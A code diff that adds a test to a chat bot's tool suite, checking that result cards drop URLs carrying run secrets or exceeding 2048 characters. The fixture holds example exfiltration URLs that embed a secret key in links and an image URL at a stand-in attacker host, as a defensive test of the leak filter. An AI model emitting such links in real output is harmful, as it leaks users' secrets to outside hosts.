@@ -173,5 +173,32 @@ describe("bot react, show_status, and show_cards tools", () => {
         ],
       },
     ]);
+    expect(ctx.state.reply.publishedMidTurnUserMessage).toBe(true);
+  });
+
+  it("drops card URLs that leak run secrets or exceed the 2048-char limit", async () => {
+    const { ctx, createdMessages } = makeContext();
+    ctx.secrets.push("sk-secret-value-123");
+    await messagingTools.show_cards!(
+      ctx,
+      makeCall({
+        items: [
+          {
+            title: "Safe item",
+            url: "https://evil.example/?q=sk-secret-value-123",
+            imageUrl: "https://evil.example/px.png?k=sk-secret-value-123",
+          },
+          {
+            title: "Long link",
+            url: `https://example.test/${"a".repeat(2100)}`,
+          },
+        ],
+      }),
+    );
+    const block = createdMessages[0]?.blocks[0];
+    expect(block).toEqual({
+      kind: "result_cards",
+      items: [{ title: "Safe item" }, { title: "Long link" }],
+    });
   });
 });
